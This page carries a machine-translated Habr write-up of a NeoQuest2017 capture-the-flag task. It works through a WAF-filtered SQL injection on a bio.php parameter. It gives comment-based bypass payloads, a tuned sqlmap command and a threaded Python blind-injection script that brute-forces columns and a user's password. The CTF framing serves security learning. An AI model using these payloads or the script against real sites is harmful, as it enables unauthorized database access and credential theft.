<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>[NeoQuest2017] ‚ÄúIn Search of Earthlings‚Äù and not only ...</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="A couple of days ago, the next qualifying online-stage of the annual competition on cyber security, NeoQuest2017, ended . I express special thanks to ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>[NeoQuest2017] ‚ÄúIn Search of Earthlings‚Äù and not only ...</h1><div class="post__text post__text-html js-mediator-article"><div style="text-align:center;"><img src="https://habrastorage.org/files/879/faf/487/879faf487269449a9ab6b5d672161703.png"></div><br>  A couple of days ago, the next qualifying online-stage of the annual competition on cyber security, <a href="http://neoquest.ru/about.php">NeoQuest2017, ended</a> .  I express special thanks to the organizers: every year the story is more and more interesting, and the tasks are more difficult! <br><br>  And this article will be devoted to the analysis of the ninth task: PARADISOS <br><a name="habracut"></a><br><blockquote><h3>  "SEARCHING FOR EARTH" </h3>  Having reached the ship of the expedition in distress, we did not find anyone there - apparently, the guys managed to get out.  But where to look for them now?  Theoretically, they could get to the planet Paradisos, the last of which we have not yet visited. <br><br>  This planet is a heavenly place: a wonderful climate, friendly inhabitants who joyfully greeted us with flowers and strange fruits, funny music and a bunch of happy aliens of all familiar and unfamiliar races.  Mini-hotels soaring in the air, billboards in various languages ‚Äã‚Äã(including earthly English).  We were solemnly escorted to a beautiful hotel, promising full assistance in finding members of the expedition and in sharing knowledge about our planets.  We managed to find out that the guys really were here and even created their own website, on which each of them made records about space travel. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      The site address has been preserved, but we only saw the names of four researchers there.  It turned out that clever aliens are demanding money for access to complete information.  Of course, we will not pay.  Let's try to "hack"! </blockquote><br>  Attached to the task is the address of the site that looks like this: <br><br><img src="https://habrastorage.org/files/332/b31/b42/332b31b42fc24ed8bbd3249108f10a79.png"><br><br>  First of all, we will figure out where the text for the biography of each of the ‚Äúresearchers‚Äù comes from: <br><br><pre><code class="javascript hljs">$(<span class="hljs-string"><span class="hljs-string">"#DanielButton"</span></span>).click(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span>{ $.ajax({<span class="hljs-attr"><span class="hljs-attr">url</span></span>: <span class="hljs-string"><span class="hljs-string">"/bio/bio.php?name=Daniel"</span></span>, <span class="hljs-attr"><span class="hljs-attr">success</span></span>: <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">result</span></span></span><span class="hljs-function">)</span></span>{ $(<span class="hljs-string"><span class="hljs-string">"#ScientistBio"</span></span>).html(result); $(<span class="hljs-string"><span class="hljs-string">"#Avatar"</span></span>).show(); $(<span class="hljs-string"><span class="hljs-string">"#Avatar"</span></span>).attr(<span class="hljs-string"><span class="hljs-string">"src"</span></span>, <span class="hljs-string"><span class="hljs-string">"img/lava.png"</span></span>); }}); });</code> </pre> <br>  <i>Follow the</i> link: " <i>./bio/bio.php?name=Daniel</i> " and see the text of the biography.  Is logical  The first thought that visited me on this page (and I hope you,%% username, too) - try SQL Injection in the name parameter. <br><br>  We try: <br><br><pre> <code class="hljs vhdl">name=Daniel'+<span class="hljs-keyword"><span class="hljs-keyword">or</span></span>+<span class="hljs-number"><span class="hljs-number">1</span></span>=<span class="hljs-number"><span class="hljs-number">1</span></span>+<span class="hljs-comment"><span class="hljs-comment">--+1</span></span></code> </pre> <br>  And to us in response: <br><br><pre> <code class="hljs vhdl">Forbidden You don<span class="hljs-symbol"><span class="hljs-symbol">'t</span></span> have permission <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> <span class="hljs-keyword"><span class="hljs-keyword">access</span></span> /bio/bio.php <span class="hljs-keyword"><span class="hljs-keyword">on</span></span> this server.</code> </pre> <br>  So the site is protected by WAF.  Well, this is more interesting: it means there is something to protect! <br>  It was established experimentally: ‚Äúinformation_scheme‚Äù, ‚Äúdatabase ()‚Äù, ‚ÄúSELECT *‚Äù, ‚ÄúUNION‚Äù are prohibited for use.  Go ahead ... <br><br>  We try: <br><br><pre> <code class="hljs lisp">name=Dan'+'i'+'el</code> </pre> <br>  And the text of his biography comes back to us.  So the space works in the form of concatenation.  Let's try another way: <br><br><pre> <code class="hljs vhdl">name=Daniel'+<span class="hljs-keyword"><span class="hljs-keyword">or</span></span><span class="hljs-comment"><span class="hljs-comment">/**_**/</span></span><span class="hljs-number"><span class="hljs-number">1</span></span>=<span class="hljs-number"><span class="hljs-number">1</span></span>+<span class="hljs-comment"><span class="hljs-comment">--+1</span></span></code> </pre> <br>  Bingo!  In response, we got a biography of all six researchers (and not 4, as on the main page): Roy, Ohad, Naomi, Daniel, Baldric and Sigizmund.  The biography of the latter reads: ‚ÄúLike ctf and space!‚Äù.  However, nowhere is the key.  So you need <s>to hammer</s> dig deeper! <br><br>  I decided to uncover heavy artillery: sqlmap ¬Ø \ _ („ÉÑ) _ / ¬Ø <br>  After the first N attempts to <s>start tyring to</s> pick up SQLi, I was expected to be a fiasco: sqlmap does not see a vector in any way, and in response there are many: ‚Äú403 Forbidden‚Äù. <br><br>  Having correctly configured the WAF bypass techniques (I had to use <a href="https://github.com/sqlmapproject/sqlmap/blob/master/tamper/space2morecomment.py">IT</a> , but I decided to write my own <s>bad</s> one using the same technique, adding only the PREFIX and SUFFIX to the beginning and end), for normal people it could look like this: <br><br><pre> <code class="hljs perl">sqlmap -u <span class="hljs-string"><span class="hljs-string">"http://IP_ADDRESS/bio/bio.php?name=*"</span></span> --level=<span class="hljs-number"><span class="hljs-number">5</span></span> --risk=<span class="hljs-number"><span class="hljs-number">3</span></span> --tamper=<span class="hljs-string"><span class="hljs-string">"space2morecomment"</span></span> --prefix=<span class="hljs-string"><span class="hljs-string">"-1%27%20"</span></span> --suffix=<span class="hljs-string"><span class="hljs-string">"%20--%201"</span></span></code> </pre> <br>  PWNED: <br><br><pre> <code class="hljs pgsql">Parameter: #<span class="hljs-number"><span class="hljs-number">1</span></span>* (URI) <span class="hljs-keyword"><span class="hljs-keyword">Type</span></span>: <span class="hljs-type"><span class="hljs-type">boolean</span></span>-based blind Title: <span class="hljs-keyword"><span class="hljs-keyword">OR</span></span> <span class="hljs-type"><span class="hljs-type">boolean</span></span>-based blind - <span class="hljs-keyword"><span class="hljs-keyword">WHERE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">HAVING</span></span> clause Payload: http://IP_ADDRESS:<span class="hljs-number"><span class="hljs-number">80</span></span>/bio/bio.php?<span class="hljs-type"><span class="hljs-type">name</span></span>=<span class="hljs-number"><span class="hljs-number">-1</span></span><span class="hljs-string"><span class="hljs-string">' OR 228=228 -- 1 Vector: OR [INFERENCE]</span></span></code> </pre> <br>  However, it was too early to rejoice: sqlmap persistently used forbidden "words" and the maximum that could be done was to use sql-shell: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/00d/000/7c6/00d0007c668541109bdae5c86518999d.png"></div><br>  In any case, my guesses were confirmed - BBbSQLi.  Remembering a couple of lessons "crazy hands" was created this: <br><br><div class="spoiler">  <b class="spoiler_title">Achtung!</b>  <b class="spoiler_title">Causes keyboard cancer</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/python3 import requests from multiprocessing.dummy import Pool as ThreadPool import sys import subprocess import time pool = ThreadPool(101) pos = 1 passwd = '' def getSockCount(): proc = subprocess.Popen(['bash', '-c', 'ss | grep IP_ADDRESS | wc -l'], stdin=subprocess.PIPE, stdout=subprocess.PIPE) output = proc.communicate()[0] return int(output.decode()) # Send SQL Request def connect(sql): url = "http://IP_ADDRESS/bio/bio.php?name=-1' or/** **/(case/** **/when/** **/%s/** **/then/** **/1/** **/else/** **/0/** **/end)=1 -- 1" req = requests.get(url % sql.replace(' ', '/** **/')) if 'Hello! My name is' in req.text: return True return False def findColumns(item): if item.isdigit(): return sql = "%s&gt;'0'" % item if connect(sql): print('Column: %s' % item) def getFieldValue(item): global passwd sql = "id=6 and substring(password,%d,1)='%s'" % (pos, item) if connect(sql): passwd += item alph = [chr(x) for x in range(ord('a'), ord('z') + 1)] + [chr(x) for x in range(ord('0'), ord('9') + 1)] + ['`', '~', '!', '@', '#', '$', '^', '&amp;', '*', '(', ')', '_', '-', '+', '=', '[', ']', '{', '}', ';', ':', '\\', '|', '?', '/'] # Brute Columns if len(sys.argv) &gt; 0: tables = open(sys.argv[1]).read().splitlines() chunk_size = max([len(x) for x in tables]) while True: pool.map(findColumns, tables) while getSockCount() &gt; 2: time.sleep(1) #      else: while True: pool.map(getFieldValue, alph) while getSockCount() &gt; 2: time.sleep(1) pos += 1 print(passwd)</span></span></code> </pre><br></div></div><br>  Using this script, the following fields were obtained: "id" and "password".  It was decided to start ‚Äúbrute‚Äù with the user ‚Äúid = 6‚Äù (aka ‚ÄúSigizmund‚Äù).  In the end, it looked something like this: <br><br><img src="https://habrastorage.org/files/a7e/218/3e5/a7e2183e50f744adac97c499bdb2502f.png"><br><br>  In the end, humans won!  Flag: 14eb6641da38addf613424f5cd05357ce261c305 </div><p>Source: <a href="https://habr.com/ru/post/323778/">https://habr.com/ru/post/323778/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../323768/index.html">How IT professionals work. Pavel Klepinin, IT Director, NIPIGAZ Center</a></li>
<li><a href="../323770/index.html">Fast factorial calculation - PrimeSwing</a></li>
<li><a href="../323772/index.html">Do you still have a chance to achieve success</a></li>
<li><a href="../323774/index.html">Big interview: how to enter ITMO University</a></li>
<li><a href="../323776/index.html">Functional safety, part 6 of 7. Evaluation of indicators of functional safety and reliability</a></li>
<li><a href="../323780/index.html">How programs are designed: from UML to automata</a></li>
<li><a href="../323784/index.html">Magento U has published a free course Fundamentals of Magento 2 Development</a></li>
<li><a href="../323786/index.html">Excursion to the Moscow production of components for communication networks. Part one</a></li>
<li><a href="../323788/index.html">INS-based interlocutor: recurrent networks</a></li>
<li><a href="../323790/index.html">Asynchronous vs delayed javascript</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>